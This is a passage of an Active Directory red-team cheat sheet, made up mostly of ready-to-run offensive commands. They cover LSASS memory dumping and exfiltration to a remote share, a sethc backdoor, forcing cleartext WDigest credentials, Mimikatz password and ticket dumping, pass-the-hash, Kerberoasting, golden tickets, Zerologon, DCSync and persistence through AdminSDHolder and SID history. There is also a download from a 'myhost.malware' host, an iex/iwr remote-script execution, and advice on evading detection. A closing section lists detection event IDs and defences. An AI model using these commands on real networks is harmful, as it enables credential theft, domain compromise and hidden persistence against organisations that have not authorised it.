<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>\PsExec.exe \\Computer -u domain\user -s powershell Enable-PSRemoting -Force
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>Invoke-WmiMethod -ComputerName &lt;&gt; -Namespace root\cimv2 -Class Win32_Process -Name Create -Credential &quot;domain\user&quot; -Impersonation 3 -EnableAllPrivileges -ArgumentList &quot;powershell Start-Process powershell -Verb runAs -ArgumentList &#39;Enable-PSRemoting –force&#39;&quot;
</span></code></pre></div></li>
<li>WMI
<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>Invoke-WmiMethod -ComputerName localmachine.security.local -Namespace root\cimv2 -Class Win32_Process -Name Create -Credential &quot;security.local\domainAdmin&quot; -Impersonation 3 -EnableAllPrivileges -ArgumentList &quot;powershell Start-Process powershell -Verb runAs -ArgumentList &#39;Enable-PSRemoting –force&#39;&quot;
</span></code></pre></div></li>
</ul>
<h2 id="privilege-escalation-local-admin">Privilege Escalation - Local Admin</h2>
<ul>
<li>PowerSploit
<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>Get-ServiceUnquoted -Verbose
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>Get-ModifiableServiceFile -Verbose
</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>Get-ModifiableService -Verbose
</span></code></pre></div></li>
<li>WMI
<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>Get-WmiObject -Class win32_service | Where-Object {$_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne &#39;&#39;)} | Where-Object { (-not $_.pathname.StartsWith(&quot;`&quot;&quot;)) -and (-not $_.pathname.StartsWith(&quot;&#39;&quot;))} | Where-Object {($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf(&quot;.exe&quot;) + 4)) -match &quot;.* .*&quot;}
</span></code></pre></div></li>
</ul>
<h2 id="reigstry-backdoors">Reigstry Backdoors</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /t REG_SZ /v Debugger /d “cmd” /f
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
</span></code></pre></div>
<h2 id="memory-dump-lolbas">Memory dump LOLBAS</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>Rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;PID&gt; C:\temp\crash_dump.bin full
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>Copy-Item –Path C:\temp\crash_dump.bin –Destination &#39;\\192.168.1.2\c$&#39;
</span></code></pre></div>
<h2 id="download-a-program">Download a Program</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>$url = &quot;https://myhost.malware/file.exe&quot;
</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>$output = &quot;./file.exe&quot;
</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>Invoke-WebRequest -Uri $url -OutFile $output
</span></code></pre></div>
<h2 id="query-sessions">Query Sessions</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>query session
</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>logoff ID
</span></code></pre></div>
<h2 id="view-passwords-in-cleartext">View passwords in cleartext</h2>
<ul>
<li>Powershell as Admin
<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>New-ItemProperty &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&quot; -Name &quot;UseLogonCredential&quot; -Value 1 -PropertyType &quot;DWord&quot;
</span></code></pre></div></li>
<li>cmd as admin
<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
</span></code></pre></div></li>
</ul>
<h2 id="rdp-without-password">RDP without password</h2>
<ul>
<li>Enable Restricted Admin to RDP without password </li>
<li>Enable RestrictedAdmin to login with NTLM hash and mstsc.exe /RestrictedAdmin</li>
<li>Use mimikatz to PTH / PTT and launch mstsc.exe /RestrictedAdmin after adding this key. 
<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
</span></code></pre></div></li>
</ul>
<h2 id="gain-foothold">Gain foothold</h2>
<ul>
<li>Reset password of users who have PASSWD_NOTREQD flag set and have never set a password.</li>
<li>BONUS: if they are part of a group which have extended rights. You can also use this account to persist, just make sure this account is ancient.
<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>Get-ADUser -Filter &quot;useraccountcontrol -band 32&quot; -Properties PasswordLastSet | Where-Object { $_.PasswordLastSet -eq $null } | select SamAccountName,Name,distinguishedname | Out-GridView 
</span></code></pre></div></li>
</ul>
<h2 id="aseproast">ASEPRoast</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>Get-ADUser -Filter {ServicePrincipalName -ne &quot;$null&quot;} -Properties ServicePrincipalName
</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>Add-Type -AssemblyName System.IndemtityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local&quot;
</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>Invoke-Mimikatz -Command &#39;&quot;kerberos::list /export&quot;  
</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>python tgsrepcrack.py wordlist.txt .kirbi
</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth 
</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a>Set-DomainObject -Identity -XOR @{useraccountcontrol=4194304} -Verbose
</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a>Get-ASREPHash -UserName -Verbose
</span><span id="__span-42-8"><a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a>Invoke-ASREPRoast -Verbose
</span></code></pre></div>
<h2 id="unconstrained-delegation">Unconstrained Delegation</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>Get-NetComputer -UnConstrained
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>Get-NetUser -UnConstrained
</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>Get-ADComputer -Filter {TrustedForDelegation -eq $True}
</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>Get-ADUser -Filter {TrustedForDelegation -eq True}
</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a>Invoke-Mimikatz -Command &#39;&quot;sekurlsa::tickets&quot;&#39;
</span></code></pre></div>
<h2 id="msds-allowedtodelegateto">msDS-AllowedToDelegateTo</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>Get-DomainUser -TrustedToAuth
</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>Get-DomainComputer -TrustedToAuth
</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne &quot;$null&quot;} -Properties msDS-AllowedToDelegateTo
</span></code></pre></div>
<h2 id="trusts">Trusts</h2>
<ul>
<li>Forest to Forest</li>
<li><a href="http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/">Read this for more info</a>
<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>lsadump::trust /patch
</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi
</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>.\asktgs.exe c:\temp\ticket.kirbi CIFS/DC.parent.local
</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>.\Rubeus.exe asktgs /ticket:c:\ad\tools\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>dir \\machine.domain.local\c$
</span></code></pre></div></li>
</ul>
<h2 id="mimikatz">Mimikatz</h2>
<ul>
<li>Remove protections such as PPL and bypass Credential Guard
<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>privilege::debug
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>!+
</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>token::elevate
</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>!processprotect /remove /process:LSASS.EXE
</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a>misc::memssp
</span></code></pre></div></li>
<li>Dump passwords
<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>Invoke-Mimikatz -Command &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot;
</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>Invoke-Mimikatz -Command &quot;privilege::debug&quot; &quot;sekurlsa::wdigest&quot;
</span></code></pre></div></li>
<li>MiniDump
<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>privilege::debug
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>sekurlsa::minidump crash_dump.bin
</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>sekurlsa::logonPasswords
</span></code></pre></div></li>
<li>Pass the Hash
<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>Invoke-Mimikatz -Command &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrateur /domain:security.local /ntlm:xxxxxxxxxxxxx&quot;
</span></code></pre></div></li>
<li>Export Tickets
<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>Invoke-Mimikatz -Command &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot;
</span></code></pre></div></li>
<li>List Kerberos encryption keys
<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>Invoke-Mimikatz -Command &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;
</span></code></pre></div></li>
<li>Credential Manager &amp; DPAPI
<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>dir \\192.168.1.2\c$\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\*
</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>mimikatz dpapi::cred /in:C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\164451c5ed8ad780d136e400bd0c50c8
</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>Invoke-Mimikatz -Command &quot;privilege::debug&quot; &quot;sekurlsa::dpapi&quot;
</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>mimikatz dpapi::cred /in:C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\164451c5ed8ad780d136e400bd0c50c8 /masterkey:e605b19f96917ed2a29c816eb2f2cfdb85c9ba67379e62721b77b3ee0e23ec6e253ba6202a1595dc63083212d8933a11bc93fc85c5bac7f04406d5d5af2e57a3
</span></code></pre></div></li>
<li>Vault 
<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>vault::cred /in:C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Vault\&quot;
</span></code></pre></div></li>
<li>List Kerberos credentials for all authenticated users (including services and computer account)
<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>Invoke-Mimikatz -Command &quot;privilege::debug&quot; &quot;sekurlsa::kerberos&quot;
</span></code></pre></div></li>
<li>Dump all local credentials on a Windows computer
<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>Invoke-Mimikatz -Command &quot;token::elevate&quot; &quot;lsadump::sam&quot;
</span></code></pre></div></li>
<li>DCSync - Golden Ticket
<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>mimikatz &quot;lsadump::dcsync /domain:security.local /user:netbios\krbtgt&quot;
</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>.\mimikatz.exe kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
</span></code></pre></div></li>
<li>Zerologon
<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>lsadump::zerologon /server:DC.security.local /account:DC$
</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>lsadump::zerologon /server:DC.security.local /account:DC$ /exploit
</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a>lsadump::dcsync /domain:security.local /dc:DC /user:krbtgt /authuser:DC$ /authdomain:security /authpassword:&quot;&quot; /authntlm
</span></code></pre></div></li>
</ul>
<h2 id="priv-escalation-ad">Priv Escalation - AD</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>Rubues.exe monitor /interval:1 &gt; tickets.txt
</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>SpoolSample.exe target client
</span></code></pre></div>
<h2 id="heidisql-portable">HeidiSQL Portable</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>select * from openquery(&quot;dcorp-sql1&quot;,&#39;select * from masters..sysservers &#39;)
</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>Get-SQLServerLinkCrawl -Instance &lt;&gt; -Verbose
</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a>EXECUTE(&#39;sp_configure &quot;xp_cmdshell&quot;,1;reconfigure;&#39;)AT(&quot;eu-sql&quot;)
</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a>Get-SQLServerLinkCrawl -Instance &lt;&gt; -Query &quot;exec master ..xp_cmdshell &#39;whoami&#39;&quot;
</span></code></pre></div>
<h1 id="persistence">Persistence</h1>
<h2 id="golden-ticket">Golden Ticket</h2>
<ul>
<li>Provide the new ID with ACLs to DCSync.</li>
<li>Give yourself or the victim Replicate DC, Replicate All, Replicate In Filtered Set to DCSync.</li>
</ul>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>Set-ADACL -DistinguishedName &#39;DC=SRV,DC=security,DC=local&#39; -Principal domainAdmin -GUIDRight DCSync -Verbose
</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>mimikatz &quot;lsadump::dcsync /domain:security.local /user:netbios\krbtgt&quot;
</span></code></pre></div>
- krbtgt requires 2 reset to mitigate golden ticket
- Evade time based detection with renewmax
- Bypass the MaxTicketAge when creating a golden ticket and check for detection</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>kerberos::golden /admin:ADMIINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>
</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a>kerberos::golden /user:Administrator /domain:security.local /sid:S-1-5-21-123456789-1234567890-1111112345 /aes128:xxxxx id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
</span></code></pre></div>
<h2 id="wmi">WMI</h2>
<ul>
<li>Add WMI Rights on a DC as persistence and execute code wheneever you want.</li>
<li>Add you account to dcomcnfg WMI -&gt; Component Services (COM Security) and Comp Management (WMI Control - root namespace)</li>
</ul>
<h2 id="adminsdholder">AdminSDHolder</h2>
<ul>
<li>This privilege will not add the ID in the Domain Admin group, however allows the ID to modify the Domain Admins group.</li>
<li>ADModule
<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>Set-ADACL -DistinguishedName &#39;CN=AdminSDHolder,CN=System,DC=SRV,DC=security,DC=local&#39; -Principal domainAdmin -Verbose
</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>Add-ADGroupMember -Identity &#39;Domain Admins&#39; -Members testda -Verbose
</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>Add-ObjectAcl -TargetIdentity &#39;CN=AdminSDHolder,CN=System,DC=security,DC=local&#39; -PrincipalIdentity hacker -Verbose -Rights All
</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a>Get-ObjectAcl -SearchBase &#39;CN=AdminSDHolder,CN=System,DC=security,DC=local&#39; -Verbose 
</span></code></pre></div></li>
<li>Invoke-ADSDPropagation
<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>powershell.exe iex (iwr &#39;https://raw.githubusercontent.com/edemilliere/ADSI/master/Invoke-ADSDPropagation.ps1&#39;)
</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a>Invoke-ADSDPropagation
</span></code></pre></div></li>
</ul>
<h2 id="sid-history">SID History</h2>
<ul>
<li>Modify the SIDHistory attribute of an ID to the SID of a privileged user.</li>
<li>Allows the user to have high privileges without being a member of that group.</li>
<li>Nice technique, however it is getting detected easily now.</li>
<li>Check if domain / trust have SID Filtering enabled beforehand.
<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>privilege::debug
</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a>token::elevate
</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a>sid::patch
</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a>sid::add /sam:&quot;hacker&quot; /new:S-1-5-21-123456789-1234567890-1111112345-519
</span></code></pre></div></li>
</ul>
<h2 id="enable-dsrm-admin-login">Enable DSRM Admin Login</h2>
<ul>
<li>Use mimikatz to dump the DSRM Admin password.</li>
<li>This hash is never changed by SysAdmins as this is a recovery account.
<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>privilege::debug
</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>lsadump::sam
</span></code></pre></div></li>
<li>Copy the NTLM Hash
<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>Domain : SECURITY
</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>SysKey : 48e9dfa91da8e1b32a38b9e45323e430
</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a>Local SID : S-1-5-21-123456789-1234567890-1111112345
</span><span id="__span-66-4"><a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a>
</span><span id="__span-66-5"><a id="__codelineno-66-5" name="__codelineno-66-5" href="#__codelineno-66-5"></a>SAMKey : 2c9d7841c1ab3a64b7e0f8d5ee3ad828
</span><span id="__span-66-6"><a id="__codelineno-66-6" name="__codelineno-66-6" href="#__codelineno-66-6"></a>
</span><span id="__span-66-7"><a id="__codelineno-66-7" name="__codelineno-66-7" href="#__codelineno-66-7"></a>RID  : 000001f4 (500)
</span><span id="__span-66-8"><a id="__codelineno-66-8" name="__codelineno-66-8" href="#__codelineno-66-8"></a>User : Administrator
</span><span id="__span-66-9"><a id="__codelineno-66-9" name="__codelineno-66-9" href="#__codelineno-66-9"></a>  Hash NTLM: af5adaaf26ccc3fab908fcb5435b49d8
</span></code></pre></div></li>
<li>PowerShell
<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD
</span></code></pre></div></li>
<li>cmd
<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>REG ADD HKLM\System\CurrentControlSet\Control\Lsa\ /v DsrmAdminLogonBehavior /t REG_DWORD /d 1 /f
</span></code></pre></div></li>
</ul>
<h1 id="ace-format">ACE Format</h1>
<ul>
<li>ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid</li>
<li><a href="https://github.com/samratashok/RACE">RACEToolkit</a></li>
</ul>
<h1 id="protection">Protection</h1>
<ul>
<li>
<p>Limit DAs login, if DA login is necessary donot allow other administrators to login to that machine.</p>
</li>
<li>
<p>Never run service with a DA priv
Add-ADGroupMember -Identity 'Domain Admins' -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)  </p>
</li>
</ul>
<h2 id="golden-ticket_1">Golden Ticket</h2>
<ul>
<li>4624: Account Logon</li>
<li>4634: Account Logoff</li>
<li>4672: Admin Logon</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>Get-WinEvent -FilterHashtable @{Logname=&#39;Security&#39;;ID=4672} -MaxEvents 1 | Format-List -Property *
</span></code></pre></div>
<h2 id="silver-ticket">Silver Ticket</h2>
<ul>
<li>4624: Account Logon</li>
<li>4634: Account Logoff</li>
<li>No 4672 due to Silver Ticket</li>
</ul>
<h2 id="skeleton-key">Skeleton Key</h2>
<ul>
<li>System 7045 - A service was installed in the system</li>
<li>4673 - Sensitive Privilege Use</li>
<li>4611 - logon process reg with LSA</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>New-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL -Value 1 -Verbose
</span></code></pre></div>
<h2 id="dsrm-admin-logon-detection">DSRM Admin Logon Detection</h2>
<ul>
<li>4657 - Audit creation/change of DSRMAdminLogonBehavior</li>
</ul>
<h2 id="kerberoasting">Kerberoasting</h2>
<ul>
<li>4769 : kerberos ticket was requested</li>
<li>Managed Service Accounts - Automatic change of password perodically</li>
<li>Service name should not be krbtgt</li>
<li>Service name should end with $</li>
<li>account name should not be machine@domain</li>
<li>Failure code is '0x0'</li>
<li>Encryption type should be 0x17</li>
</ul>
<h2 id="delegation-defenses">Delegation defenses</h2>
<ul>
<li>Account is sensitive and cannot be delegated for privileged accounts</li>
</ul>
<h2 id="acl-attacks">ACL Attacks</h2>
<ul>
<li>4662 - An operation was performed on an object</li>
<li>5136 - A directory service object was modified</li>
<li>4670 - Permissions on object were changed</li>
<li>4780 - The ACL was set on accounts which are members of administrators groups</li>
<li>
<p>4756 - Account was added to security-enabled universal group</p>
</li>
<li>
<p>http://github.com/canix1/ADACLScanner</p>
</li>
</ul>
<h2 id="sidfiltering">SIDFiltering</h2>
<ul>
<li>Enable SIDFiltering</li>
<li>Selective Authentication</li>
</ul>
<h2 id="ata">ATA</h2>
<ul>
<li>4776</li>
<li>Builds profile over time</li>
<li>UEBA in 4 weeks for org</li>
<li>
<p>Lightweight gateway on DCs</p>
</li>
<li>
<p>Ignore Get-NetGroupMember and Get-NetComputer</p>
</li>
<li>Use AES256 and AES128 to bypass Over Pass The Hash Detection and Golden Ticket Detection</li>
<li>Envrypted PA-DATA PA-ENC-TIMESTAMP</li>
<li>Create Ticket for non-existent user</li>
<li>DCSync is not spoofable until ST is used</li>
<li>DCShadow is not detected, which allows DCSync</li>
</ul>
<h2 id="laps">LAPS</h2>
<ul>
<li>ms-mcs-AdmPwd</li>
<li>ms-mcs-AdmPwdExpirationTime</li>
<li>AdmPwd.dll</li>
<li>Which users are allowed to view these LAPS </li>
</ul>
<h2 id="credential-guard">Credential Guard</h2>
<ul>
<li>Blocks PTH and over PTH </li>
<li>SAM and LSA Secrets are not protected</li>
<li>Cannot be enabled over a domain controller as it breaks authentication over there</li>
</ul>
<h2 id="protected-users-group">Protected Users Group</h2>
<ul>
<li>Cannot use CredSSP and WDigest - clear text caching stop</li>
<li>NTLM is not cached</li>
